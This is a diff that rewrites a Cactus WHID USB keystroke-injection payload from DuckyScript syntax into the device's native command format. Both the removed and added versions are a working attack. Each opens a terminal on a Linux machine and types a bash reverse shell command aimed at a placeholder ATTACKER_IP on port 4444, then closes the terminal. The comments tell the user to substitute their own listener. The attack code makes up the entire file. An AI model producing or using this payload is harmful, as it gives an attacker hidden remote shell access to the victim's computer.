@@ -1,13 +1,10 @@
-REM === Cactus WHID Payload: Linux Bash Reverse Shell ===
-REM Target: Linux (Ubuntu, Debian, Kali, etc.)
-REM Category: Reverse Shell & Access
-REM Description: Opens terminal via Ctrl+Alt+T and launches bash reverse shell
-REM Replace: ATTACKER_IP and port 4444 with your listener
-DELAY 1000
-CTRL ALT t
-DELAY 800
-STRING nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
-ENTER
-DELAY 200
-STRING exit
-ENTER
+Rem: Cactus WHID Payload - Linux Bash Reverse Shell
+Rem: Target - Linux (Ubuntu, Debian, Kali, etc.)
+Rem: Opens terminal via Ctrl+Alt+T and launches bash reverse shell
+Rem: Replace ATTACKER_IP and port 4444 with your listener
+CustomDelay:1000
+Press:128+130+116
+CustomDelay:800
+PrintLine:nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
+CustomDelay:200
+PrintLine:exit
